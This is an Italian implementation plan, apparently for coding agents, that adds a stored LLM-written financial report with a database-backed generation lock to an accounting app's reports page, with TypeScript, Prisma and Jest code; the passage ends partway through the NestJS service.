# Report LLM nella pagina Report — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** aggiungere alla pagina `/reports` una sezione con un report scritto dall'LLM attivo sul periodo selezionato, salvato a DB, generato automaticamente alla prima apertura e rigenerabile a mano con conferma, con un lock che impedisce di far ripartire una generazione già in corso anche uscendo e rientrando dalla pagina.

**Architecture:** job detached lato backend con stato persistito su una riga `LlmReport` univoca per `(userId, scope, periodKey, accountsKey)`; il vincolo unique è il lock, la claim è un `updateMany` condizionale. Il frontend fa polling ogni 3s finché lo stato è `generating` e mostra skeleton animato + cronometro. Nuovo modulo Nest autonomo `llm-reports` per non creare cicli con `LlmChatModule`.

**Tech Stack:** NestJS 10, Prisma/PostgreSQL, `ollama` client + `OpencodeClient`, React 19, React Query v5, ky, react-markdown, Tailwind, shadcn/ui.

**Spec:** `docs/superpowers/specs/2026-08-31-report-llm-design.md`

## Global Constraints

- UI, messaggi d'errore e commenti in **italiano**; identificatori in inglese.
- Importi in **centesimi**, `BigInt` serializzato come **stringa**.
- Operazioni distruttive: sempre `useConfirm()` (`components/shared/confirm.tsx`), **mai** `window.confirm`.
- Ogni nuova API va replicata negli handler demo (`frontend/src/lib/demo/handlers.ts`).
- Il markdown prodotto dall'LLM va renderizzato con l'hardening esistente (immagini rimosse, link inerti).
- Scope coperti: `annual` e `monthly`. Il "Confronto periodi" **non** ha report LLM.
- `STALE_LOCK_MS = 15 * 60_000`; timeout chiamata Ollama `240_000` ms; OpenCode ha già il suo tetto di 120s dentro `OpencodeClient.chat`.
- Nessun fallback silenzioso: se l'LLM fallisce, lo stato va a `error` con messaggio leggibile.
- Verifica finale obbligatoria: `npm run build` e `npm run lint` su `backend/` e `frontend/`, `npx jest` su `backend/`.

---

### Task 1: Schema Prisma + chiavi e lock (logica pura)

**Files:**
- Modify: `backend/prisma/schema.prisma` (enum + model + relazione su `User`)
- Create: `backend/src/llm-reports/llm-report.keys.ts`
- Test: `backend/src/llm-reports/llm-report.keys.spec.ts`

**Interfaces:**
- Consumes: niente (primo task)
- Produces: `LlmReportScope`, `buildPeriodKey`, `buildAccountsKey`, `periodRange`, `previousPeriodRange`, `periodLabel`, `buildFingerprint`, `isStaleLock`, `STALE_LOCK_MS`

- [ ] **Step 1: Scrivere il test che fallisce**

Crea `backend/src/llm-reports/llm-report.keys.spec.ts`:

```ts
import {
  STALE_LOCK_MS,
  buildAccountsKey,
  buildFingerprint,
  buildPeriodKey,
  isStaleLock,
  periodLabel,
  periodRange,
  previousPeriodRange,
} from './llm-report.keys';

describe('llm-report.keys', () => {
  describe('buildAccountsKey', () => {
    it('usa "all" quando non ci sono conti selezionati', () => {
      expect(buildAccountsKey()).toBe('all');
      expect(buildAccountsKey([])).toBe('all');
    });

    it('non dipende dall_ordine di selezione', () => {
      const a = '11111111-1111-4111-8111-111111111111';
      const b = '22222222-2222-4222-8222-222222222222';
      expect(buildAccountsKey([a, b])).toBe(buildAccountsKey([b, a]));
    });

    it('distingue selezioni diverse', () => {
      const a = '11111111-1111-4111-8111-111111111111';
      const b = '22222222-2222-4222-8222-222222222222';
      expect(buildAccountsKey([a])).not.toBe(buildAccountsKey([a, b]));
      expect(buildAccountsKey([a])).not.toBe('all');
    });

    it('ignora i duplicati', () => {
      const a = '11111111-1111-4111-8111-111111111111';
      expect(buildAccountsKey([a, a])).toBe(buildAccountsKey([a]));
    });
  });

  describe('buildPeriodKey', () => {
    it('anno per lo scope annuale', () => {
      expect(buildPeriodKey('annual', 2026)).toBe('2026');
    });

    it('anno-mese con lo zero davanti per il mensile', () => {
      expect(buildPeriodKey('monthly', 2026, 7)).toBe('2026-07');
      expect(buildPeriodKey('monthly', 2026, 12)).toBe('2026-12');
    });

    it('rifiuta il mensile senza mese', () => {
      expect(() => buildPeriodKey('monthly', 2026)).toThrow();
    });
  });

  describe('periodRange', () => {
    it('copre tutto l_anno', () => {
      const { from, to } = periodRange('annual', 2026);
      expect(from.toISOString().slice(0, 10)).toBe('2026-01-01');
      expect(to.toISOString().slice(0, 10)).toBe('2026-12-31');
    });

    it('finisce sull_ultimo giorno del mese, bisestili inclusi', () => {
      expect(periodRange('monthly', 2024, 2).to.toISOString().slice(0, 10)).toBe('2024-02-29');
      expect(periodRange('monthly', 2026, 2).to.toISOString().slice(0, 10)).toBe('2026-02-28');
      expect(periodRange('monthly', 2026, 7).to.toISOString().slice(0, 10)).toBe('2026-07-31');
    });
  });

  describe('previousPeriodRange', () => {
    it('anno precedente per l_annuale', () => {
      const { from, to } = previousPeriodRange('annual', 2026);
      expect(from.toISOString().slice(0, 10)).toBe('2025-01-01');
      expect(to.toISOString().slice(0, 10)).toBe('2025-12-31');
    });

    it('mese precedente, scavallando l_anno a gennaio', () => {
      const { from, to } = previousPeriodRange('monthly', 2026, 1);
      expect(from.toISOString().slice(0, 10)).toBe('2025-12-01');
      expect(to.toISOString().slice(0, 10)).toBe('2025-12-31');
    });
  });

  describe('periodLabel', () => {
    it('etichette leggibili in italiano', () => {
      expect(periodLabel('annual', 2026)).toBe('anno 2026');
      expect(periodLabel('monthly', 2026, 7)).toBe('luglio 2026');
    });
  });

  describe('buildFingerprint', () => {
    it('cambia se cambiano totali o numero di movimenti', () => {
      const base = { incomeCents: '1000', expenseCents: '-500', txCount: 3 };
      expect(buildFingerprint(base)).toBe(buildFingerprint({ ...base }));
      expect(buildFingerprint(base)).not.toBe(buildFingerprint({ ...base, txCount: 4 }));
      expect(buildFingerprint(base)).not.toBe(buildFingerprint({ ...base, expenseCents: '-600' }));
    });
  });

  describe('isStaleLock', () => {
    const now = new Date('2026-08-31T12:00:00Z');

    it('un job appena partito è vivo', () => {
      expect(isStaleLock(new Date(now.getTime() - 60_000), now)).toBe(false);
    });

    it('oltre la finestra è considerato morto', () => {
      expect(isStaleLock(new Date(now.getTime() - STALE_LOCK_MS - 1000), now)).toBe(true);
    });
  });
});
```

- [ ] **Step 2: Eseguire il test e verificare che fallisca**

Run: `cd backend && npx jest src/llm-reports/llm-report.keys.spec.ts`
Expected: FAIL — "Cannot find module './llm-report.keys'"

- [ ] **Step 3: Implementare `llm-report.keys.ts`**

```ts
import { createHash } from 'node:crypto';

/** Le due modalità della pagina Report che hanno un report LLM. */
export type LlmReportScope = 'annual' | 'monthly';

/**
 * Un job `generating` più vecchio di questa finestra è considerato morto: è il
 * caso del backend riavviato a metà generazione, che altrimenti lascerebbe
 * quella cella bloccata per sempre. La finestra è molto più larga del tetto di
 * una singola chiamata LLM (240s) per non riclaimare mai un job vivo ma lento.
 */
export const STALE_LOCK_MS = 15 * 60_000;

const MONTH_NAMES = [
  'gennaio', 'febbraio', 'marzo', 'aprile', 'maggio', 'giugno',
  'luglio', 'agosto', 'settembre', 'ottobre', 'novembre', 'dicembre',
];

/** `2026` per l'annuale, `2026-07` per il mensile. */
export function buildPeriodKey(scope: LlmReportScope, year: number, month?: number): string {
  if (scope === 'annual') return String(year);
  if (!month) throw new Error('Il report mensile richiede il mese.');
  return `${year}-${String(month).padStart(2, '0')}`;
}

/**
 * Chiave della selezione conti. L'elenco è ordinato e deduplicato prima
 * dell'hash: spuntare gli stessi conti in ordine diverso deve riusare lo stesso
 * report, non generarne un altro. `all` (nessun filtro) resta un valore
 * letterale, distinto dall'hash di una selezione che per caso li contiene tutti.
 */
export function buildAccountsKey(accountIds?: string[]): string {
  if (!accountIds || accountIds.length === 0) return 'all';
  const normalized = [...new Set(accountIds)].sort().join(',');
  return createHash('sha1').update(normalized).digest('hex');
}

/** Intervallo UTC inclusivo del periodo, stessa aritmetica di `ReportsController`. */
export function periodRange(
  scope: LlmReportScope,
  year: number,
  month?: number,
): { from: Date; to: Date } {
  if (scope === 'annual') {
    return { from: new Date(Date.UTC(year, 0, 1)), to: new Date(Date.UTC(year, 11, 31)) };
  }
  if (!month) throw new Error('Il report mensile richiede il mese.');
  // Il giorno 0 del mese successivo è l'ultimo del mese corrente: gestisce
  // anche i bisestili senza tabelle di giorni.
  return { from: new Date(Date.UTC(year, month - 1, 1)), to: new Date(Date.UTC(year, month, 0)) };
}

/** Periodo precedente (anno-1 / mese-1), usato dal prompt per il confronto. */
export function previousPeriodRange(
  scope: LlmReportScope,
  year: number,
  month?: number,
): { from: Date; to: Date } {
  if (scope === 'annual') return periodRange('annual', year - 1);
  if (!month) throw new Error('Il report mensile richiede il mese.');
  return month === 1 ? periodRange('monthly', year - 1, 12) : periodRange('monthly', year, month - 1);
}

/** Etichetta leggibile del periodo, per prompt e UI. */
export function periodLabel(scope: LlmReportScope, year: number, month?: number): string {
  if (scope === 'annual') return `anno ${year}`;
  if (!month) throw new Error('Il report mensile richiede il mese.');
  return `${MONTH_NAMES[month - 1]} ${year}`;
}

/**
 * Impronta dei dati del periodo al momento della generazione: serve a dire
 * "questo report non è più aggiornato" senza rileggere tutte le transazioni.
 * Limite noto: una modifica che lascia totali e conteggio identici (per esempio
 * il cambio di categoria di un movimento) non viene rilevata.
 */
export function buildFingerprint(totals: {
  incomeCents: string;
  expenseCents: string;
  txCount: number;
}): string {
  return `${totals.txCount}:${totals.incomeCents}:${totals.expenseCents}`;
}

/** Un lock è scaduto se il job che lo ha preso è più vecchio di `STALE_LOCK_MS`. */
export function isStaleLock(startedAt: Date, now: Date = new Date()): boolean {
  return now.getTime() - startedAt.getTime() > STALE_LOCK_MS;
}
```

- [ ] **Step 4: Eseguire il test e verificare che passi**

Run: `cd backend && npx jest src/llm-reports/llm-report.keys.spec.ts`
Expected: PASS (tutti i casi)

- [ ] **Step 5: Aggiungere enum e model a `backend/prisma/schema.prisma`**

Aggiungi l'enum vicino agli altri enum (dopo `enum NotificationChannel`):

```prisma
enum LlmReportStatus {
  generating
  ready
  error

  @@map("llm_report_status")
}
```

Aggiungi il model in fondo al file:

```prisma
/// Report testuale generato dall'LLM per un periodo della pagina Report.
/// Salvato per non rigenerarlo a ogni ritorno sullo stesso periodo.
/// Il vincolo unique è anche il LOCK della generazione: la claim è un
/// `updateMany` condizionale su `status`, quindi due richieste simultanee non
/// producono due generazioni. Un record `generating` più vecchio di 15 minuti
/// è considerato morto (backend riavviato a metà) e riclaimabile.
model LlmReport {
  id     String @id @default(uuid()) @db.Uuid
  userId String @map("user_id") @db.Uuid
  /// 'annual' | 'monthly' — le sole modalità con report LLM.
  scope  String @db.VarChar(10)
  /// '2026' per l'annuale, '2026-07' per il mensile.
  periodKey String @map("period_key") @db.VarChar(10)
  /// 'all' oppure sha1 degli accountId ORDINATI: l'ordine di selezione non
  /// deve moltiplicare le righe.
  accountsKey     String          @map("accounts_key") @db.VarChar(64)
  status          LlmReportStatus
  /// Markdown del report. Resta valorizzato durante una rigenerazione, così la
  /// UI può mostrare il testo precedente invece di una pagina vuota.
  content         String?
  provider        String?         @db.VarChar(20)
  model           String?         @db.VarChar(120)
  /// Impronta dei dati alla generazione ("txCount:income:expense"): se non
  /// combacia più, la UI mostra il badge "dati cambiati".
  dataFingerprint String?         @map("data_fingerprint") @db.VarChar(120)
  errorMessage    String?         @map("error_message")
  startedAt       DateTime        @default(now()) @map("started_at") @db.Timestamptz()
  completedAt     DateTime?       @map("completed_at") @db.Timestamptz()

  user User @relation(fields: [userId], references: [id], onDelete: Cascade)

  @@unique([userId, scope, periodKey, accountsKey])
  @@map("llm_reports")
}
```

Aggiungi la relazione inversa nel model `User`, in coda alla lista delle relazioni (dopo `categoryMemories CategoryMemory[]`):

```prisma
  llmReports          LlmReport[]
```

- [ ] **Step 6: Rigenerare il client Prisma e verificare che lo schema sia valido**

Run: `cd backend && npx prisma validate && npx prisma generate`
Expected: "The schema at prisma/schema.prisma is valid" + "Generated Prisma Client"

- [ ] **Step 7: Commit**

```bash
git add backend/prisma/schema.prisma backend/src/llm-reports/llm-report.keys.ts backend/src/llm-reports/llm-report.keys.spec.ts
git commit -m "report llm: modello LlmReport e chiavi periodo/conti con lock scaduto"
```

---

### Task 2: Costruzione del prompt (logica pura)

**Files:**
- Create: `backend/src/llm-reports/llm-report.prompt.ts`
- Test: `backend/src/llm-reports/llm-report.prompt.spec.ts`

**Interfaces:**
- Consumes: `LlmReportScope` da `./llm-report.keys`; i tipi `PeriodTotals` e `CategoryNode` da `../reports/reports.service`
- Produces: `ReportSnapshot`, `TopExpense`, `buildReportPrompt(snapshot: ReportSnapshot): string`, `formatEuro(cents: string): string`

- [ ] **Step 1: Scrivere il test che fallisce**

Crea `backend/src/llm-reports/llm-report.prompt.spec.ts`:

```ts
import { buildReportPrompt, formatEuro, type ReportSnapshot } from './llm-report.prompt';

const snapshot: ReportSnapshot = {
  scope: 'monthly',
  label: 'luglio 2026',
  previousLabel: 'giugno 2026',
  accountsLabel: 'tutti i conti',
  totals: { incomeCents: '250000', expenseCents: '-180000', netCents: '70000', txCount: 42 },
  previousTotals: { incomeCents: '250000', expenseCents: '-150000', netCents: '100000', txCount: 38 },
  series: [
    { label: '01', incomeCents: '0', expenseCents: '-5000' },
    { label: '02', incomeCents: '250000', expenseCents: '-1000' },
  ],
  expenseTree: [
    {
      categoryIds: ['c1'],
      categoryName: 'Casa',
      color: null,
      amountCents: '90000',
      count: 5,
      children: [
        { categoryIds: ['c2'], categoryName: 'Affitto', color: null, amountCents: '80000', count: 1, children: [] },
      ],
    },
  ],
  incomeTree: [
    { categoryIds: ['c3'], categoryName: 'Stipendio', color: null, amountCents: '250000', count: 1, children: [] },
  ],
  topExpenses: [
    { date: '2026-07-02', description: 'Affitto luglio', amountCents: '-80000', categoryName: 'Affitto' },
    { date: '2026-07-15', description: null, amountCents: '-12000', categoryName: null },
  ],
};

describe('formatEuro', () => {
  it('converte i centesimi in euro con due decimali', () => {
    expect(formatEuro('250000')).toBe('2500.00 €');
  });

  it('mostra le uscite in valore assoluto', () => {
    expect(formatEuro('-180000')).toBe('1800.00 €');
  });

  it('regge importi oltre il limite di Number senza perdere precisione', () => {
    expect(formatEuro('900719925474099100')).toBe('9007199254740991.00 €');
  });
});

describe('buildReportPrompt', () => {
  const prompt = buildReportPrompt(snapshot);

  it('dice al modello di che periodo e di quali conti si tratta', () => {
    expect(prompt).toContain('luglio 2026');
    expect(prompt).toContain('tutti i conti');
  });

  it('include totali del periodo e del periodo precedente per il confronto', () => {
    expect(prompt).toContain('2500.00 €');
    expect(prompt).toContain('1800.00 €');
    expect(prompt).toContain('giugno 2026');
  });

  it('include le categorie di uscita con le sottocategorie', () => {
    expect(prompt).toContain('Casa');
    expect(prompt).toContain('Affitto');
  });

  it('include le entrate per categoria', () => {
    expect(prompt).toContain('Stipendio');
  });

  it('include i movimenti più grandi, con un segnaposto se manca la descrizione', () => {
    expect(prompt).toContain('Affitto luglio');
    expect(prompt).toContain('(senza descrizione)');
  });

  it('non passa al modello gli id interni', () => {
    expect(prompt).not.toContain('c1');
    expect(prompt).not.toContain('c3');
  });

  it('chiede le sezioni previste, in italiano e in markdown', () => {
    for (const section of ['Sintesi', 'Andamento', 'Dove sono finiti i soldi', 'Cosa mi ha colpito', 'Consigli']) {
      expect(prompt).toContain(section);
    }
    expect(prompt.toLowerCase()).toContain('markdown');
  });

  it('vieta immagini e link, che il frontend dovrebbe poi neutralizzare', () => {
    expect(prompt.toLowerCase()).toContain('nessun link');
  });
});
```

- [ ] **Step 2: Eseguire il test e verificare che fallisca**

Run: `cd backend && npx jest src/llm-reports/llm-report.prompt.spec.ts`
Expected: FAIL — "Cannot find module './llm-report.prompt'"

- [ ] **Step 3: Implementare `llm-report.prompt.ts`**

```ts
import type { CategoryNode, PeriodTotals } from '../reports/reports.service';
import type { LlmReportScope } from './llm-report.keys';

/** Un movimento "grosso" del periodo, materiale per la sezione anomalie. */
export interface TopExpense {
  date: string;
  description: string | null;
  amountCents: string;
  categoryName: string | null;
}

/**
 * Tutto ciò che il modello vede del periodo. Solo aggregati più una manciata di
 * movimenti: passare tutte le transazioni costerebbe token e allargherebbe
 * inutilmente la superficie privacy.
 */
export interface ReportSnapshot {
  scope: LlmReportScope;
  label: string;
  previousLabel: string;
  accountsLabel: string;
  totals: PeriodTotals;
  previousTotals: PeriodTotals;
  series: { label: string; incomeCents: string; expenseCents: string }[];
  expenseTree: CategoryNode[];
  incomeTree: CategoryNode[];
  topExpenses: TopExpense[];
}

/** Quante categorie di primo livello passare per verso. Oltre è rumore. */
const MAX_CATEGORIES = 12;
/** Quante sottocategorie per categoria padre. */
const MAX_CHILDREN = 5;

/**
 * Centesimi (stringa, perché a DB sono BigInt) → euro. In valore assoluto: il
 * segno lo dà già il contesto ("uscite"), e un "-1800.00 €" sotto la voce
 * uscite confonde il modello quanto l'utente.
 */
export function formatEuro(cents: string): string {
  const value = BigInt(cents);
  const abs = value < 0n ? -value : value;
  const units = abs / 100n;
  const decimals = abs % 100n;
  return `${units}.${String(decimals).padStart(2, '0')} €`;
}

function formatTotals(totals: PeriodTotals): string {
  return [
    `entrate ${formatEuro(totals.incomeCents)}`,
    `uscite ${formatEuro(totals.expenseCents)}`,
    `saldo ${BigInt(totals.netCents) < 0n ? '-' : '+'}${formatEuro(totals.netCents)}`,
    `${totals.txCount} movimenti`,
  ].join(', ');
}

function formatTree(nodes: CategoryNode[]): string {
  if (nodes.length === 0) return '(nessun dato)';
  return nodes
    .slice(0, MAX_CATEGORIES)
    .map((node) => {
      const children = node.children
        .slice(0, MAX_CHILDREN)
        .map((child) => `    - ${child.categoryName}: ${formatEuro(child.amountCents)} (${child.count})`)
        .join('\n');
      const head = `  - ${node.categoryName}: ${formatEuro(node.amountCents)} (${node.count} mov.)`;
      return children ? `${head}\n${children}` : head;
    })
    .join('\n');
}

/**
 * Prompt del report. Il modello riceve SOLO aggregati e nomi di categoria — mai
 * gli id interni, che non gli servono e che finirebbero nel testo mostrato.
 */
export function buildReportPrompt(s: ReportSnapshot): string {
  const seriesLabel = s.scope === 'annual' ? 'Andamento per mese' : 'Andamento per giorno';
  const series = s.series
    .map((p) => `  - ${p.label}: entrate ${formatEuro(p.incomeCents)}, uscite ${formatEuro(p.expenseCents)}`)
    .join('\n');
  const top = s.topExpenses
    .map(
      (t) =>
        `  - ${t.date} · ${t.description?.trim() || '(senza descrizione)'} · ${formatEuro(t.amountCents)}` +
        `${t.categoryName ? ` · ${t.categoryName}` : ''}`,
    )
    .join('\n');

  return `Sei l'assistente finanziario di un'app di contabilità famigliare. Scrivi un report chiaro e concreto sul periodo indicato, rivolgendoti direttamente all'utente ("hai speso…").

DATI DEL PERIODO — ${s.label} (${s.accountsLabel})
Totali: ${formatTotals(s.totals)}
Periodo precedente (${s.previousLabel}): ${formatTotals(s.previousTotals)}

${seriesLabel}:
${series || '  (nessun dato)'}

Uscite per categoria:
${formatTree(s.expenseTree)}

Entrate per categoria:
${formatTree(s.incomeTree)}

Movimenti di uscita più grandi:
${top || '  (nessun movimento)'}

ISTRUZIONI
- Rispondi in italiano, in **markdown**, con esattamente queste sezioni di secondo livello: "## Sintesi", "## Andamento", "## Dove sono finiti i soldi", "## Cosa mi ha colpito", "## Consigli".
- Usa solo i dati qui sopra: non inventare cifre, categorie o movimenti che non compaiono. Se un dato non c'è, dillo.
- Cita gli importi in euro come sono scritti sopra.
- Confronta col periodo precedente quando è significativo (variazioni sotto il 5% non meritano una riga).
- "Consigli": al massimo 3, concreti e legati a numeri di questo periodo. Niente consigli generici da manuale.
- Massimo 450 parole in tutto. Niente titolo di primo livello, nessun link, nessuna immagine, nessun blocco di codice.`;
}
```

- [ ] **Step 4: Eseguire il test e verificare che passi**

Run: `cd backend && npx jest src/llm-reports/llm-report.prompt.spec.ts`
Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add backend/src/llm-reports/llm-report.prompt.ts backend/src/llm-reports/llm-report.prompt.spec.ts
git commit -m "report llm: costruzione del prompt da dati aggregati"
```

---

### Task 3: `topTransactions` in ReportsService

**Files:**
- Modify: `backend/src/reports/reports.service.ts` (aggiungere il metodo pubblico in coda ai metodi pubblici, prima di `private accessibleTxWhere`)

**Interfaces:**
- Consumes: `accessibleTxWhere` privato già esistente
- Produces: `TopTransaction` (`{ date: string; description: string | null; amountCents: string; categoryName: string | null }`) e `ReportsService.topTransactions(userId, from, to, accountIds?, limit?): Promise<TopTransaction[]>`

- [ ] **Step 1: Aggiungere il tipo esportato**

Vicino agli altri tipi esportati in cima al file (dopo `DailyPoint`):

```ts
/** Movimento "grosso" del periodo, usato dal report LLM per le anomalie. */
export interface TopTransaction {
  date: string;
  description: string | null;
  amountCents: string;
  categoryName: string | null;
}
```

- [ ] **Step 2: Implementare il metodo**

```ts
  /**
   * I movimenti di uscita più grandi del periodo. Serve al report LLM per
   * poter citare spese specifiche: passa dall'ACL come tutti gli altri
   * aggregati, quindi non può mai pescare da conti non accessibili.
   */
  async topTransactions(
    userId: string,
    from: Date,
    to: Date,
    accountIds?: string[],
    limit = 15,
  ): Promise<TopTransaction[]> {
    const rows = await this.prisma.transaction.findMany({
      where: this.accessibleTxWhere(
        userId,
        {
          transactionDate: { gte: from, lte: to },
          type: TransactionType.expense,
        },
        accountIds,
      ),
      // Le uscite sono negative a DB: la più grande è la più negativa.
      orderBy: { amountCents: 'asc' },
      take: limit,
      select: {
        transactionDate: true,
        description: true,
        amountCents: true,
        category: { select: { name: true } },
      },
    });
    return rows.map((r) => ({
      date: r.transactionDate.toISOString().slice(0, 10),
      description: r.description,
      amountCents: r.amountCents.toString(),
      categoryName: r.category?.name ?? null,
    }));
  }
```

- [ ] **Step 3: Verificare che compili**

Run: `cd backend && npx tsc --noEmit -p tsconfig.json`
Expected: nessun errore su `reports.service.ts` (eventuali errori preesistenti altrove vanno segnalati, non "sistemati" alla cieca)

- [ ] **Step 4: Commit**

```bash
git add backend/src/reports/reports.service.ts
git commit -m "reports: topTransactions per il report LLM"
```

---

### Task 4: Servizio, controller e modulo del report LLM

**Files:**
- Create: `backend/src/llm-reports/dto/llm-report.dto.ts`
- Create: `backend/src/llm-reports/llm-reports.service.ts`
- Create: `backend/src/llm-reports/llm-reports.controller.ts`
- Create: `backend/src/llm-reports/llm-reports.module.ts`
- Modify: `backend/src/app.module.ts`

**Interfaces:**
- Consumes: `buildAccountsKey`, `buildPeriodKey`, `periodRange`, `previousPeriodRange`, `periodLabel`, `buildFingerprint`, `isStaleLock`, `STALE_LOCK_MS` (Task 1); `buildReportPrompt`, `ReportSnapshot` (Task 2); `ReportsService.topTransactions` (Task 3); `LlmConfigService.getActiveConfig()`, `OpencodeClient.chat(tier, apiKey, body)` (esistenti, esportati da `LlmChatModule`)
- Produces: `LlmReportView` (payload del GET), `LlmReportsService.getStatus()`, `LlmReportsService.requestGeneration()`

- [ ] **Step 1: DTO**

Crea `backend/src/llm-reports/dto/llm-report.dto.ts`:

```ts
import { Transform, Type } from 'class-transformer';
import {
  IsArray,
  IsBoolean,
  IsIn,
  IsInt,
  IsOptional,
  IsUUID,
  Max,
  Min,
} from 'class-validator';

/**
 * Espone `?accountIds=...` sia come singolo valore sia come array (stesso
 * helper di `reports.dto.ts`: è cinque righe, duplicarlo costa meno che
 * inventare un modulo condiviso di transform).
 */
const ToStringArray = () =>
  Transform(({ value }) => {
    if (value === undefined || value === null || value === '') return undefined;
    return Array.isArray(value) ? value : [value];
  });

export class LlmReportQueryDto {
  @IsIn(['annual', 'monthly'])
  scope!: 'annual' | 'monthly';

  @Type(() => Number)
  @IsInt()
  @Min(2000)
  @Max(2100)
  year!: number;

  /** Obbligatorio quando `scope` è `monthly` (validato nel servizio). */
  @IsOptional()
  @Type(() => Number)
  @IsInt()
  @Min(1)
  @Max(12)
  month?: number;

  @IsOptional()
  @ToStringArray()
  @IsArray()
  @IsUUID('4', { each: true })
  accountIds?: string[];
}

export class GenerateLlmReportDto extends LlmReportQueryDto {
  /** Sovrascrive un report già presente. La UI lo manda solo dopo conferma. */
  @IsOptional()
  @IsBoolean()
  force?: boolean;
}
```

- [ ] **Step 2: Servizio**

Crea `backend/src/llm-reports/llm-reports.service.ts`:

```ts
import {
  BadRequestException,
  ConflictException,
  Injectable,
  Logger,
  ServiceUnavailableException,
} from '@nestjs/common';
import { ConfigService } from '@nestjs/config';
import { Ollama } from 'ollama';
import { LlmReportStatus, Prisma } from '@prisma/client';
import { PrismaService } from '../prisma/prisma.service';
import { ReportsService } from '../reports/reports.service';
import { LlmConfigService, type ActiveLlmConfig } from '../llm-chat/llm-config.service';
import { OpencodeClient } from '../llm-chat/opencode.client';
import {
  STALE_LOCK_MS,
  buildAccountsKey,
  buildFingerprint,
  buildPeriodKey,
  isStaleLock,
  periodLabel,
  periodRange,
  previousPeriodRange,
  type LlmReportScope,
} from './llm-report.keys';
import { buildReportPrompt, type ReportSnapshot } from './llm-report.prompt';

/** Chiave univoca della riga: e' anche il lock della generazione. */
interface LlmReportKey {
  userId: string;
  scope: LlmReportScope;
  periodKey: string;
  accountsKey: string;
}

/** Parametri del periodo, uguali per GET e POST. */
export interface LlmReportParams {
  scope: LlmReportScope;
  year: number;
  month?: number;
  accountIds?: string[];
}

/** Payload letto dalla UI. `missing` = non è mai stato generato. */
export interface LlmReportView {
  status: 'missing' | 'generating' | 'ready' | 'error';
  content: string | null;
  generatedAt: string | null;
  provider: string | null;
  model: string | null;
  /** I dati del periodo sono cambiati dopo la generazione. */
  stale: boolean;
  /** Secondi trascorsi dall'inizio della generazione in corso. */
  elapsedSeconds: number | null;
  errorMessage: string | null;
}

/**
 * Tetto per la chiamata a Ollama, sotto i 300s di `headersTimeout` di undici:
 * così a scadere è il NOSTRO abort, con un messaggio riconoscibile, invece di
 * un opaco "fetch failed". OpenCode ha già il suo tetto (120s) dentro
 * `OpencodeClient.chat`.
 */
const OLLAMA_TIMEOUT_MS = 240_000;
/** Il modello resta caricato tra una generazione e l'altra: su CPU il caricamento è la parte lenta. */
const OLLAMA_KEEP_ALIVE = '30m';

/**
 * Report testuale del periodo scritto dall'LLM attivo.
 *
 * La generazione è un job **detached**: la POST ritorna 202 e il lavoro
 * prosegue in background. Lo stato sta a DB e non in memoria — deve
 * sopravvivere alla PWA uccisa da iOS, valere tra dispositivi diversi e non
 * tornare "premibile" se il backend si riavvia a metà.
 */
@Injectable()
export class LlmReportsService {
  private readonly logger = new Logger(LlmReportsService.name);
  private readonly ollama: Ollama | null;

  constructor(
    config: ConfigService,
    private readonly prisma: PrismaService,
    private readonly reports: ReportsService,
    private readonly llmConfig: LlmConfigService,
    private readonly opencode: OpencodeClient,
  ) {
    const host = config.get<string>('OLLAMA_BASE_URL');
    // Fetch personalizzato: il client `ollama` non espone un AbortSignal per le
    // chiamate non in streaming, ma accetta un fetch alternativo.
    this.ollama = host ? new Ollama({ host, fetch: fetchWithTimeout }) : null;
  }

  async getStatus(userId: string, params: LlmReportParams): Promise<LlmReportView> {
    const key = this.keyOf(userId, params);
    const row = await this.prisma.llmReport.findUnique({
      where: { userId_scope_periodKey_accountsKey: key },
    });
    if (!row) return emptyView();

    // Un job rimasto appeso (backend riavviato) non deve tenere la UI in
    // caricamento per sempre: lo raccontiamo come errore, e la claim successiva
    // lo riprende.
    if (row.status === LlmReportStatus.generating && isStaleLock(row.startedAt)) {
      return {
        status: 'error',
        content: row.content,
        generatedAt: row.completedAt?.toISOString() ?? null,
        provider: row.provider,
        model: row.model,
        stale: false,
        elapsedSeconds: null,
        errorMessage: 'La generazione precedente si è interrotta. Riprova.',
      };
    }

    let stale = false;
    if (row.status === LlmReportStatus.ready && row.dataFingerprint) {
      const { from, to } = periodRange(params.scope, params.year, params.month);
      const totals = await this.reports.periodTotals(userId, from, to, params.accountIds);
      stale = buildFingerprint(totals) !== row.dataFingerprint;
    }

    return {
      status: row.status,
      content: row.content,
      generatedAt: row.completedAt?.toISOString() ?? null,
      provider: row.provider,
      model: row.model,
      stale,
      elapsedSeconds:
        row.status === LlmReportStatus.generating
          ? Math.round((Date.now() - row.startedAt.getTime()) / 1000)
          : null,
      errorMessage: row.errorMessage,
    };
  }

  /**
   * Prende il lock e avvia la generazione. Il lock è la riga stessa: la claim è
   * un `updateMany` condizionale, atomico lato Postgres, quindi due click
   * simultanei da due dispositivi non generano due volte.
   */
  async requestGeneration(
    userId: string,
    params: LlmReportParams,
    force: boolean,
  ): Promise<{ status: 'generating' }> {
    const key = this.keyOf(userId, params);
    const now = new Date();
    const existing = await this.prisma.llmReport.findUnique({
      where: { userId_scope_periodKey_accountsKey: key },
    });

    if (existing) {
      if (existing.status === LlmReportStatus.generating && !isStaleLock(existing.startedAt, now)) {
        throw new ConflictException('Un report per questo periodo è già in generazione.');
      }
      if (existing.status === LlmReportStatus.ready && !force) {
        throw new ConflictException(
          'Esiste già un report per questo periodo: conferma la sovrascrittura per rigenerarlo.',
        );
      }
      const claimed = await this.prisma.llmReport.updateMany({
        where: {
          id: existing.id,
          OR: [
            { status: { not: LlmReportStatus.generating } },
            { startedAt: { lt: new Date(now.getTime() - STALE_LOCK_MS) } },
          ],
        },
        data: {
          status: LlmReportStatus.generating,
          startedAt: now,
          completedAt: null,
          errorMessage: null,
        },
      });
      if (claimed.count === 0) {
        throw new ConflictException('Un report per questo periodo è già in generazione.');
      }
    } else {
      try {
        await this.prisma.llmReport.create({
          data: { ...key, status: LlmReportStatus.generating, startedAt: now },
        });
      } catch (e) {
        // P2002 = un'altra richiesta ha creato la riga nello stesso istante:
        // il lock ce l'ha lei, non noi.
        if (e instanceof Prisma.PrismaClientKnownRequestError && e.code === 'P2002') {
          throw new ConflictException('Un report per questo periodo è già in generazione.');
        }
        throw e;
      }
    }

    // Detached: nessun await. Il try/catch è dentro `runGeneration`, altrimenti
    // un errore diventerebbe una unhandled rejection.
    void this.runGeneration(userId, params, key);
    return { status: 'generating' };
